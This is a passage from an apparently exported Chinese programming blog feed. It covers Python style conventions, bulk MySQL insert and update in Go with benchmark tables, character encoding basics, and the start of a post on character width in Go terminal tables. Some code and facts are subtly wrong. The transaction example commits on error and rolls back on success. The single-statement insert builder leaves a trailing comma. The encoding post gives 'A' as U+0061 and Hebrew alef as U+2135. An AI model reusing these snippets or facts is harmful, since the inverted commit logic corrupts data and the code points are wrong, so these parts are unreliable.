InvalidUsage, ServerError) 字符串引用Python中单引号字符串和双引号字符串都是相同的。注意尽量避免在字符串中的反斜杠以提高可读性。比如一段字符串里面既有单引号，又有双引号，就的使用 多行字符串的方式，避免使用 \” 或\’1error = """My Class hasn't "test" attribute.""" 表达式和语句中的空格12345678910111213141516171819202122# 括号里边避免空格 spam(ham[1], &#123;eggs: 2&#125;)# 逗号，冒号，分号之前避免空格if x == 4: print x, y; x, y = y, x# 索引操作符不留空格ham[1:9:3]# 函数调用的左括号之前不能有空格spam(1)# 二元操作符两边留一个空格,涉及 =、符合操作符 ( += , -=等)、比较( == , &lt; , &gt; , != , &lt;&gt; , &lt;= , &gt;= , in , not in , is , is not )、布尔( and , or , not )x = 1# 搞优先级运算符前后不留空格hypot2 = x*x + y*yc = (a+b) * (a-b)# 关键字参数和默认值参数的前后不要加空格def complex(real, imag=0.0): return magic(r=real, i=imag)# 函数注释中，=前后要有空格，冒号和"-&gt;"的前面无空格，后面有空格。def munge(sep: AnyStr = None):def munge() -&gt; AnyStr:# 尽量不使用复合语句(Compound statements: 多条语句写在同一行)if foo == 'blah': do_blah_thing() 普通注释通用规则: 与代码自相矛盾的注释比没注释更差。修改代码时要优先更新注释！ 注释是完整的句子。如果注释是断句，首字母应该大写，除非它是小写字母开头的标识符(永远不要修改标识符的大小写)。 如果注释很短，可以省略末尾的句号。注释块通常由一个或多个段落组成。段落由完整的句子构成且每个句子应该以点号(后面要有两个空格)结束，并注意断词和空格。 非英语国家的程序员请用英语书写你的注释，除非你200%确信代码永远不会被不懂你的语言的人阅读。 注释块: 注释块通常应用在代码前，并和这些代码有同样的缩进。每行以 ‘# ‘(除非它是注释内的缩进文本，注意#后面有空格)。 注释块内的段落用仅包含单个 ‘#’ 的行分割。 行内注释: 慎用行内注释(Inline Comments) 节俭使用行内注释。 行内注释是和语句在同一行，至少用两个空格和语句分开。行内注释不是必需的，重复罗嗦会使人分心。 123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 文档注释这部分很重要, 他是Python独有的, 为所有公共模块、函数、类和方法书写文档字符串。非公开方法不一定有文档字符串，建议有注释(出现在def行之后)来描述这个方法做什么, 详情参考PEP 257 文档字符串约定, 但是这部分我比较推崇Google Style风格。 文档字符串什么是文档字符串(Document String):文档字符串是包, 模块, 类或函数里的第一个语句. 这些字符串可以通过对象的__doc__成员被自动提取, 并且被pydoc所用. 文档字符串的格式:首先是一行以句号, 问号或惊叹号结尾的概述(或者该文档字符串单纯只有一行). 接着是一个空行. 接着是文档字符串剩下的部分,它应该与文档字符串的第一行的第一个引号对齐. 下面有更多文档字符串的格式化规范. 模块文档模块说明: 对这个模块进行概貌性的描述, 比如Json库的说明1234567891011121314151617181920212223242526r"""JSON (JavaScript Object Notation) &lt;http://json.org&gt; is a subset ofJavaScript syntax (ECMA-262 3rd edition) used as a lightweight datainterchange format.:mod:`json` exposes an API familiar to users of the standard library:mod:`marshal` and :mod:`pickle` modules. It is the externally maintainedversion of the :mod:`json` library contained in Python 2.6, but maintainscompatibility with Python 2.4 and Python 2.5 and (currently) hassignificant performance advantages, even without using the optional Cextension for speedups.Compact encoding:: &gt;&gt;&gt; import json &gt;&gt;&gt; json.dumps([1,2,3,&#123;'4': 5, '6': 7&#125;], sort_keys=True, separators=(',',':')) '[1,2,3,&#123;"4":5,"6":7&#125;]'Using json.tool from the shell to validate and pretty-print:: $ echo '&#123;"json":"obj"&#125;' | python -m json.tool &#123; "json": "obj" &#125; $ echo '&#123; 1.2:3.4&#125;' | python -m json.tool Expecting property name enclosed in double quotes: line 1 column 3 (char 2)""" 函数和方法文档这里说的函数,包括函数, 方法, 以及生成器。 一个函数必须要有文档字符串, 除非它满足以下条件: 外部不可见 非常短小 简单明了 文档字符串应该提供足够的信息, 当别人编写代码调用该函数时, 他不需要看一行代码, 只要看文档字符串就可以了.因此需要描述清楚以下几点: 函数参数: Args列出每个参数的名字, 并在名字后使用一个冒号和一个空格, 分隔对该参数的描述.如果描述太长超过了单行80字符,使用2或者4个空格的悬挂缩进(与文件其他部分保持一致). 描述应该包括所需的类型和含义. 如果一个函数接受foo(可变长度参数列表)或者**bar (任意关键字参数), 应该详细列出foo和**bar. 正常返回: Returns/Yields描述返回值的类型和语义. 如果函数返回None, 这一部分可以省略. 异常返回: Raises:列出与接口有关的所有异常. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): """Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: &#123;'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')&#125; If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. """ pass 类文档同理类也需要做详尽的描述: 该类的目的, 以及概貌描述 类有公共属性(Attributes), 需要描述其意义 注意事项 继承object, 因为object实现了一些内置方法,方便兼容。 123456789101112131415161718class SampleClass(object): """Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. """ def __init__(self, likes_spam=False): """Inits SampleClass with blah.""" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): """Performs operation blah.""" TODO注释如果类或者方法，函数 没有实现完整功能, 请使用TODO标记, 很多IDE都能找到这个标记, 方便以后改进, 别留坑.12# TODO(kl@gmail.com): Use a "*" here for string repetition.# TODO(Zeke) Change this to use relations. 访问控制合理的访问控制会使得代码更加健壮 __slots__: 控制对象可以绑定的属性, 避免对象被临时添加属性，造成对象的不可预期行为。 @property: 通过属性装饰器控制属性的读和写的行为, 防止不符合规范数据的录入。 __或者_: 使用下划线开头的变量，为私有变量(只是别名了, 你真想访问还是有办法的, 但是请不要这样做)。 __all__: 对于from import来说, 导出指定对象, 防止导出全局变量。 注意: 对暴露出去的共有变量请慎重, 因为如果你暴露出去过会, 下次在调整就需要考虑到兼容性了, 所以优先使用私有变量(__或者_)。 123456789101112131415class Student(object): __slots__ = ['birth', 'age'] @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth 命名约定Python库的命名约定有点混乱，不可能完全一致。但依然有些普遍推荐的命名规范的。新的模块和包 (包括第三方的框架) 应该遵循这些标准。对不同风格的已有的库，建议保持内部的一致性。 包和模块名: 模块名要简短，全部用小写字母，可使用下划线以提高可读性。包名和模块名类似，但不推荐使用下划线 类名: 遵循CapWord。 函数和方法的参数: 实例方法第一个参数是 ‘self’。类方法第一个参数是 ‘cls’。如果函数的参数名与保留关键字冲突，通常在参数名后加一个下划线。 方法名和实例变量: 同函数命名规则。 非公开方法和实例变量增加一个前置下划线。 为避免与子类命名冲突，采用两个前置下划线来触发重整。类Foo属性名为__a， 不能以 Foo.__a访问。(执著的用户还是可以通过Foo._Foo__a。) 通常双前置下划线仅被用来避免与基类的属性发生命名冲突。 函数名: 函数名应该为小写，必要时可用下划线分隔单词以增加可读性。 mixedCase(混合大小写)仅被允许用于兼容性考虑(如: threading.py)。 异常名: 如果确实是错误，需要在类名添加后缀 “Error”。 全局变量名: 变量尽量只用于模块内部，约定类似函数。 对设计为通过 “from M import ” 来使用的模块，应采用__all__机制来防止导入全局变量；或者为全局变量加一个前置下划线。 常量: 常量通常在模块级定义,由大写字母用下划线分隔组成。比如括MAX_OVERFLOW和TOTAL。 合理的设计接口设计考虑类的方法和实例变量(统称为属性)是否公开。如果有疑问，选择不公开；把其改为公开比把公开属性改为非公开要容易。公开属性可供所有人使用，并通常向后兼容。非公开属性不给第三方使用、可变甚至被移除。这里不使用术语”private”， Python中没有属性是真正私有的。另一类属性是子类API(在其他语言中通常称为 “protected”)。 一些类被设计为基类，可以扩展和修改。 谨记这些Python指南： 公开属性应该没有前导下划线 如果公开属性名和保留关键字冲突，可以添加后置下划线 简单的公开数据属性，最好只公开属性名，没有复杂的访问/修改方法，python的Property提供了很好的封装方法。 如果不希望子类使用的属性，考虑用两个前置下划线(没有后置下划线)命名 任何向后兼容的保证只适用于公共接口。 文档化的接口通常是公共的，除非明说明是临时的或为内部接口、其他所有接口默认是内部的。 为了更好地支持内省，模块要在__all__属性列出公共API。 内部接口要有前置下划线。 如果命名空间(包、模块或类)是内部的，里面的接口也是内部的。 导入名称应视为实现细节。其他模块不能间接访名字，除非在模块的API文档中明确记载，如os.path中或包的__init__暴露了子模块。 函数设计当流程足够繁杂时，就要考虑函数，及如何将函数组合在一起。在Python中做函数设计，主要考虑到函数大小、聚合性、耦合性三个方面，这三者应该归结于规划与设计的范畴。高内聚、低耦合则是任何语言函数设计的总体原则。 如何将任务分解成更有针对性的函数从而导致了聚合性 如何设计函数间的通信则又涉及到耦合性 如何设计函数的大小用以加强其聚合性及降低其耦合性 聚合 完美的程序设计，每个函数应该而且只需做一件事 比如说:把大象放进冰箱分三步:把门打开、把大象放进去、把门关上。 这样就应该写三个函数而不是一个函数拿所有的事全做了。这样结构清晰，层次分明，也好理解！ 大小 Python代码以简单明了著称，一个过长或者有着深层嵌套的函数往往成为设计缺陷的征兆。 如果项目中设计的一个函数需要翻页才能看完的话，就要考虑将函数拆分了。 耦合 参数传入，return结果, 这样做可以让函数独立于它外部的东西。参数和return语句就是隔离外部依赖的最好的办法。 慎用全局变量, 全局变量通常是一种蹩脚的函数间的进行通信的方式。它会引发依赖关系和计时的问题，从而会导致程序调试和修改的困难。而且从代码及性能优化来考虑，本地变量远比全局变量快。 避免修改可变类型的参数（或者直接避免传入可变类型的参数，而使用args， 或者*kwargs 收集）Python数据类型比如说列表、字典属于可变对象。在作为参数传递给函数时，有时会像全局变量一样被修改。这样做的坏处是：增强了函数之间的耦合性，从而导致函数过于特殊和不友好。维护起来也困难。这个时候就要考虑使用切片S[:]和copy模块中的copy()函数和deepcopy()函数来做个拷贝，避免修改可变对象 参考文档 PEP8官方文档 PEP8中文翻译 Google Python风格指南]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pythonic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL批量更新与插入]]></title>
    <url>%2F2017%2F06%2F19%2Fmysql-performance-for-bulk-action%2F</url>
    <content type="text"><![CDATA[最近一直使用gorm来操作数据库, 但当遇到一些批量操作时,感觉性能很差, 原因很简单, gorm是一条一条的执行的,效率很低, 所以对于批量操作, 特别是对于大量record需要创建或者修改时, 直接使用SQL, 才是正确的选择。 调整MySQL配置(MariaDB10) bulk_insert_buffer_size: 调整批量插入缓冲， 默认是16M, 为了能支持更大数据的批量插入, 按需调整, 我这里调整到128M net_buffer_length: 客户发出的SQL语句期望的长度, 默认是16K。如果语句超过这个长度，缓冲区自动地被扩大，直到max_allowed_packet个字节, 我调整到128K max_allowed_packet: 一个包的最大尺寸, 默认也是16M。消息缓冲区被初始化为net_buffer_length字节，但是可在需要时增加到max_allowed_packet个字节, 我也调整到128M 将这些配置写入MySQL的配置文件中123bulk_insert_buffer_size = 128Mnet_buffer_length = 128Kmax_allowed_packet = 128M 从启MySQL查看这些全局变量是否生效12345678910111213141516171819202122232425262728293031Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 142Server version: 10.1.21-MariaDB-1~jessie mariadb.org binary distributionCopyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.MariaDB [(none)]&gt; show variables like "bulk_insert_buffer_size";+-------------------------+----------+| Variable_name | Value |+-------------------------+----------+| bulk_insert_buffer_size | 16777216 |+-------------------------+----------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "net_buffer_length";+-------------------+-------+| Variable_name | Value |+-------------------+-------+| net_buffer_length | 16384 |+-------------------+-------+1 row in set (0.00 sec)MariaDB [(none)]&gt; show variables like "max_allowed_packet";+--------------------+----------+| Variable_name | Value |+--------------------+----------+| max_allowed_packet | 16777216 |+--------------------+----------+1 row in set (0.00 sec) 使用事务批量创建和修改多条记录时, 如果使用了多条语句, 请一定使用事物, 因为这些动作是一个事物, 避免部分成功,部分失败 造成数据不一致的问题。12345678tx,_ := db.Begin() stm,_ := Tx.Preapare("insert into test values(?,null)") result,err := stm.Exec('123')if err != nil &#123; tx.Commit()&#125; else &#123; tx.Rollback()&#125; 批量插入批量插入的方法一般包含: 直接循环提供(非常不推荐) 基于事物的循环提交 利用INSERT INTO的多值插入语句 这里以插入10000条数据为例进行测试, 关于下面的测试代码见: 测试代码完整示例 直接循环提交123456789101112131415// 使用For循环执行func forInsert() &#123; start := time.Now() stmt, err := db.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; delta := time.Now().Sub(start).String() fmt.Println("For Insert Total Time: ", delta)&#125; 基于事物循环提交12345678910111213141516171819202122232425262728// 在一个事物内循环执行func withTxInsert() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare(`INSERT user (user_name,user_age,user_sex) values (?,?,?)`) checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) _, err := stmt.Exec(name, i, 1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Insert Total Time: ", delta)&#125; 构造成一条语句提交SQL样例: “INSERT INTO table (field1,field2,field3) VALUES (‘a’,’b’,’c’), (‘a’,’b’,’c’),(‘a’,’b’,’c’);”12345678910111213141516171819202122232425262728// 构造一条Insert语句批量提交func bulkoneInsert() &#123; start := time.Now() sql := "INSERT INTO `user` (`user_name`,`user_age`,`user_sex`) VALUES " for i := 0; i &lt; 10000; i++ &#123; name := "tony" + strconv.Itoa(i) if i &lt; 10000 &#123; sql += fmt.Sprintf("('%s','%d','%d'),", name, i, 1) &#125; else &#123; sql += fmt.Sprintf("('%s','%d','%d');", name, i, 1) &#125; &#125; // fmt.Println(sql) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk One Insert Total Time: ", delta)&#125; 总结最对3种状况的插入时间排名: Ranking Function Name Time 1 bulkoneInsert 283.548003ms 2 withTxInsert 4.047390845s 3 forInsert 1m55.580310398s 结论很明显: 构造一条SQL插入效率高很多 批量更新我们可以使用多个UPDATE语句批量提交, 同时MySQL也支持一个SQL语句批量更新多条记录, 标准的SQL是使用UPDATE WHEN来实现, 除此之外 他的SQL扩展还支持INSERT INTO 和REPLACE INTO用于record的批量更新, 但是最好别用REPLACE INTO, 因为他是先删除再新增, 因此本质上它不是更新操作, 因为删除后, 更新时缺少某些字段的话, 会导致数据丢失, 这在业务上是绝对不允许的, 请谨慎使用 REPLACE INTO。而INSERT INTO则不会这样。 最后使用临时表也能进行批量更新(先更新临时表，然后从临时表中update),效率也相当不错,但是需要用户有temporary表的create权限, 因此使用也受限。我一般会使用INSERT INTO来构造批量更新的SQL, 因为该语法方便构造, 下面会对各种操作做简单的性能对比。 这里以更新10000条数据为例进行测试(基于上面插入的数据), 关于下面的测试代码见: 测试代码完整示例 循环更新1234567891011121314151617181920212223242526272829// 循环更新// UPDATE table SET column1=?,column2=? WHERE column=?func withTxUpdate() &#123; start := time.Now() tx, err := db.Begin() checkErr(err) stmt, err := tx.Prepare("UPDATE `user` SET `user_name`=? WHERE `user_id`=?;") checkErr(err) for i := 0; i &lt; 10000; i++ &#123; name := "forupdate" + strconv.Itoa(i) _, err := stmt.Exec(name, i+1) checkErr(err) &#125; if err != nil &#123; err := tx.Rollback() checkErr(err) return &#125; err = tx.Commit() checkErr(err) delta := time.Now().Sub(start).String() fmt.Println("Bulk With Transaction Update Total Time: ", delta)&#125; 标准的UPDATE语句批量更新12345678910111213141516171819202122232425262728293031323334353637383940414243// 标准Update语句更新// UPDATE categories// SET dingdan = CASE id// WHEN 1 THEN 3// WHEN 2 THEN 4// WHEN 3 THEN 5// END,// title = CASE id// WHEN 1 THEN 'New Title 1'// WHEN 2 THEN 'New Title 2'// WHEN 3 THEN 'New Title 3'// END// WHERE id IN (1,2,3)func bulkStandardUpdate() &#123; start := time.Now() core := "" where := "" for i := 0; i &lt; 10000; i++ &#123; name := "standardupdate" + strconv.Itoa(i) core += fmt.Sprintf("WHEN '%d' THEN '%s' ", i+1, name) if i == 0 &#123; where += fmt.Sprintf("'%d'", i+1) &#125; else &#123; where += fmt.Sprintf(",'%d'", i+1) &#125; &#125; sql := fmt.Sprintf("UPDATE `user` SET `user_name`= CASE `user_id` %s END WHERE `user_id` IN (%s)", core, where) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Standard Update Total Time: ", delta)&#125; SQL扩展(INSERT INTO … ON DUPLICATE KEY UPDATE)123456789101112131415161718192021222324252627282930// insert into语句更新// INSERT INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y') ON DUPLICATE KEY UPDATE dr=values(dr);func bulkInsertIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "insertintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("INSERT INTO `user` (`user_id`, `user_name`) VALUES %s ON DUPLICATE KEY UPDATE `user_name`=values(`user_name`);", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Insert Into Update Total Time: ", delta)&#125; SQL扩展(REPLACE INTO)123456789101112131415161718192021222324252627282930// replace inot语句更新// REPLACE INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y');func bulkReplaceIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "replaceintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("REPLACE INTO `user` (`user_id`, `user_name`) VALUES %s;", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Replace Into Update Total Time: ", delta)&#125; 总结最对4种状况的插入时间排名: Ranking Function Name Time 1 bulkInsertIntoUpdate 462.575115ms 2 bulkReplaceIntoUpdate 564.974107ms 3 bulkStandardUpdate 3.160858907s 4 withTxUpdate 3.998437161s 结论很明显: InsertInto更新效率高很多]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码知识与常见乱码问题的解决办法]]></title>
    <url>%2F2017%2F05%2F14%2Funicode-war%2F</url>
    <content type="text"><![CDATA[有一个即使在经验丰富的程序员中也非常常见的误解就是，纯文本使用ASCII码并且每个字符都是8bits。事实上并不存在这样的纯文本 ，如果在内存或者是硬盘上面有一个你不知道编码的字符串，那么你将无法翻译或者显示它 ，这绝对没有第二条路可选。 数据的本质: 二进制CPU能识别的数据: CPU是利用数字电路设计出来的,所以仅能识别二进制的数据。磁盘能识别的数据： 磁盘上有很多磁性的点，而这些点 有2种状态，所以任何数据 仅能转换成2进程 ，及01 代码 才能利用磁盘的点的这种特性 来进行存储 ，所以任何存储在磁盘上的数据 都是二进制网络传输的数据：通过网络输出过来的数据，为高低电频，也对应二进制 但是为啥我们看到的数据都不是01代码喃, 比如数据： 一串二进制的bits：0100100001000101010011000100110001001111 为啥最后我们用文本工具打开后, 看到的是HELLO而不是01代码本身喃？那文本编辑器是怎么将二进制翻译成字符的喃？这里有2个关键的问题: 字节是怎样分组的？（例如1个字节表示一个字符还是2个字节表示一个字符） 一个或多个字节是怎么映射到字符上的? 这就是我们要说的编码需要解决的问题。 编码概念编码的核心是定义了如下2件事情: 字节是怎么分组的，如8 bits或16 bits一组，这也被称作编码单元。 编码单元和字符之间的映射关系。例如，在ASCII码中，十进制65映射到字母A上 编码之战混战年代很久以前，计算机制造商有自己的表示字符的方式。他们并不需要担心如何和其它计算机交流，并提出了各自的方式来将字形渲染到屏幕上。随着计算机越来越流行，厂商之间的竞争更加激烈，在不同的计算机体系间转换数据变得十分蛋疼，人们厌烦了这种自定义造成的混乱。 ASCII码的到来最终，计算机制造商一起制定了一个标准的方法来描述字符。他们定义使用一个字节的低7位来表示字符，并且制作了如上图所示的对照表来映射七个比特的值到一个字符上。例如，字母A是65，c是99，~是126等等， ASCII码就这样诞生了。原始的ASCII标准定义了从0到127 的字符，这样正好能用七个比特表示。不过好景不长。。。 ASCII码第八位 引起的战争为什么选择了7个比特而不是8个来表示一个字符呢？我并不关心。但是一个字节是8个比特，这意味着1个比特并没有被使用，也就是从128到255的编码并没有被制定ASCII标准的人所规定，这些美国人对世界的其它地方一无所知甚至完全不关心。其它国家的人趁这个机会开始使用128到255范围内的编码来表达自己语言中的字符。例如，144在阿拉伯人的ASCII码中是گ，而在俄罗斯的ASCII码中是ђ。即使在美国，对于未使用区域也有各种各样的利用。IBM PC就出现了“OEM 字体”或”扩展ASCII码”，为用户提供漂亮的图形文字来绘制文本框并支持一些欧洲字符，例如英镑（£）符号。再强调一遍，ASCII码的问题在于尽管所有人都在0-127号字符的使用上达成了一致，但对于128-255号字符却有很多很多不同的解释。你必须告诉计算机使用哪种风格的ASCII码才能正确显示128-255号的字符。这对于北美人和不列颠群岛的人来说不算什么问题，因为无论使用哪种风格的ASCII码，拉丁字母的显示都是一样的。英国人还需要面对的问题是原始的ASCII码中不包含英镑符号，但是这个已经无关紧要了。与此同时，在亚洲有更让人头疼的问题。亚洲语言有更多的字符和字形需要被存储，一个字节已经不够用了。所以他们开始使用两个字节来存储字符，这被称作DBCS（双字节编码方案）。在DBCS中，字符串操作变得很蛋疼，你应该怎么做str++或str–？这些问题成为了系统开发者的噩梦。例如，MS DOS必须支持所有风格的ASCII码，因为他们想把软件卖到其他国家去。他们提出了「内码表」这一概念。例如，你需要告诉DOS（通过使用”chcp”命令）你想使用保加利亚语的内码表，它才能显示保加利亚字母。内码表的更换会应用到整个系统。这对使用多种语言工作的人来说是一个问题，因为他们必须频繁的在几个内码表之间来回切换。尽管内码表是一个好主意，但是它不是一个简洁的解决方案，它只是一个hack技术或者说是简单的修正来让编码系统可以工作。 Unicode的世界最终，美国人意识到他们应该提出一种标准方案来展示世界上所有语言中的所有字符，以便缓解程序员的痛苦和避免字符编码引发的第三次世界大战。出于这个目的，Unicode诞生了。Unicode背后的想法非常简单，然而却被普遍的误解了。Unicode就像一个电话本，标记着字符和数字之间的映射关系。Joel称之为「神奇数字」，因为它们可能是随机指定的，而且不会给出任何解释。官方术语是码位(Code Point)，总是用U+开头。理论上每种语言中的每种字符都被Unicode协会指定了一个神奇数字。例如希伯来文中的第一个字母א，是U+2135，字母A是U+0061。Unicode并不涉及字符是怎么在字节中表示的，它仅仅指定了字符对应的数字，仅此而已。关于Unicode的其它误解包括：Unicode支持的字符上限是65536个，Unicode字符必须占两个字节。告诉你这些的人应该去换换脑子了。记住，Unicode只是一个用来映射字符和数字的标准。它对支持字符的数量没有限制，也不要求字符必须占两个、三个或者其它任意数量的字节。Unicode字符是怎样被编码成内存中的字节这是另外的话题，它是被UTF(Unicode Transformation Formats)定义的。 Unicode的实现两个最流行的Unicode编码方案是UTF-8和UTF-16。让我们看看它们的细节UTF-8是一个非常惊艳的概念，它漂亮的实现了对ASCII码的向后兼容，以保证Unicode可以被大众接受。发明它的人至少应该得个诺贝尔和平奖。在UTF-8中，0-127号的字符用1个字节来表示，使用和US-ASCII相同的编码。这意味着1980年代写的文档用UTF-8打开一点问题都没有。只有128号及以上的字符才用2个，3个或者4个字节来表示。因此，UTF-8被称作可变长度编码。0100100001000101010011000100110001001111这个字节流在ASCII和UTF-8中表示相同的字符：HELLO另一个流行的可变长度编码方案是UTF-16，它使用2个或者4个字节来存储字符。然而，人们逐渐意识到UTF-16可能会浪费存储空间，但那是另一个话题了。 编码排序低字节序(Little Endian)和高字节序(Big Endian)Endian读作End-ian或者Indian。这个术语的起源可以追溯到格列佛游记。（小说中，小人国为水煮蛋应该从大的一端（Big-End）剥开还是小的一端（Little-End）剥开而争论，争论的双方分别被称为“大端派”和“小端派”。）低字节序和高字节序只是一个关于在内存中存储和读取一段字节（被称作words）的约定。这意味着当你让计算机用UTF-16把字母A（占两个字节）存在内存中时，使用哪种字节序方案决定了你把第一个字节放在第二个字节的前面还是后面。这么说有点不太容易懂，让我们来看一个例子：当你使用UTF-16存下来自你朋友的附件时，在不同的系统中它的后半部分可能是这样的：00 68 00 65 00 6C 00 6C 00 6F（高字节序，高位字节被存在前面）68 00 65 00 6C 00 6C 00 6F 00（低字节序，低位字节被存在前面）字节序方案只是一个微处理器架构设计者的偏好问题，例如，Intel使用低字节序，Motorola使用高字节序。 字节顺序标记如果你经常要在高低字节序的系统间转换文档，并且希望区分字节序，还有一种奇怪的约定，被称作BOM。BOM是一个设计得很巧妙的字符，用来放在文档的开头告诉阅读器该文档的字节序。在UTF-16中，它是通过在第一个字节放置FE FF来实现的。在不同字节序的文档中，它会被显示成FF FE或者FE FF，清楚的把这篇文档的字节序告诉了解释器。 BOM尽管很有用，但并不是很简洁，因为还有一个类似的概念，称作「魔术字」(Magic Byte)，很多年来一直被用来表明文件的格式。BOM和魔术字间的关系一直没有被清楚的定义过，因此有的解释器会搞混它们。 常见的编码引起的问题我们看到的任何输出，都是程序展示我们的，程序根据编码来进行这个映射关系的转换，如果程序把这编码搞错了，就会出现乱码问题当软件不能确定编码的时候，它会猜测。大部分时候，它会猜测是否是涵盖了ASCII码的UTF-8，还是ISO-8859-1，也有可能猜其他能想到的任意字符集。因为英文中使用的拉丁字母表在几乎所有的字符集中都能显示，包括UTF-8，所以即使编码猜错了，英文字母看起来也是正确的。 浏览器乱码问题如果你在浏览网页时看到�符号，这意味着这个网页的编码不是你的浏览器猜测的那个。这时你可以点开浏览器的查看-&gt;字符编码菜单来尝试不同的编码。 对于程序开发者来说，因避免让浏览器 猜测文档的编码，因此： 永远记得通过Content-Type或者meta charset标签来显式指定你的文档的编码。这样浏览器就不需要猜测你使用的编码了，他们会准确的使用你指定的编码来渲染文档。 编辑器乱码问题例如 我用 vim 打开一个 utf8 编码的文件：通过输入 set encoding ，会发现此时编辑器 使用的编码是 latin1通过 set encoding=utf8 ，把编码转换过来如果想这个配置永久生效 ，请写入vim 的配置文件吧 Xshell 虚拟终端乱码问题我在xshell终端下 tail 一个utf8 编码的文件，这个命令取得的结果会送到 Xshell 终端 ，然后有Xshell 终端进行解码，展示在我们面前原本的数据 是utf8编码的，但是我们终端 却选用Arabic 来进行解码，所以乱码现在我们将Xshell 的编码换成 utf8 总结编码表 就是一张映射表，不同的编码有自己的映射规则12数据 ——–&gt; 二进制 （软件来编码）二进制 ——–&gt; 数据 （软件来解码） 如果编码和解码不是同一种编码，那么就会出现乱码，这个加密解码一个道理]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang获取字符的宽度(East_Asian_Width)]]></title>
    <url>%2F2017%2F05%2F10%2Fgolang-char-width%2F</url>
    <content type="text"><![CDATA[最近在用golang写CLI, 数据在终端以Table方式展示和MySLQ输出的表格一样, 使用的是一个GitHub上不怎么出名的项目, 因为该项目逻辑清晰, 功能也完善, 自己也能很好的看懂, 容易维护, 但是前些天出了一个问题: 录入中文字符和一些特殊字符过会让Table无法对齐, 我已经fork过来修复了, 但是其中涉及到的知识点, 想通过这篇博客来讲清楚。 问题我使用一个叫simpletalbe的库: GitHub地址, 我使用他的例子, 添加了一行中文输入，结果是这样的:123456789101112131415161718Default style+----+------------------+--------------+-----------------------------+------+| # | NAME | PHONE | EMAIL | QTTY |+----+------------------+--------------+-----------------------------+------+| 1 | Newton G. Goetz | 252-585-5166 | NewtonGGoetz@dayrep.com | 10 || 2 | Rebecca R. Edney | 865-475-4171 | RebeccaREdney@armyspy.com | 12 || 3 | John R. Jackson | 810-325-1417 | JohnRJackson@armyspy.com | 15 || 4 | Ron J. Gomes | 217-450-8568 | RonJGomes@rhyta.com | 25 || 5 | Penny R. Lewis | 870-794-1666 | PennyRLewis@rhyta.com | 5 || 6 | Sofia J. Smith | 770-333-7379 | SofiaJSmith@armyspy.com | 3 || 7 | Karlene D. Owen | 231-242-4157 | KarleneDOwen@jourrapide.com | 12 || 8 | Daniel L. Love | 978-210-4178 | DanielLLove@rhyta.com | 44 || 9 | Julie T. Dial | 719-966-5354 | JulieTDial@jourrapide.com | 8 || 10 | Juan J. Kennedy | 908-910-8893 | 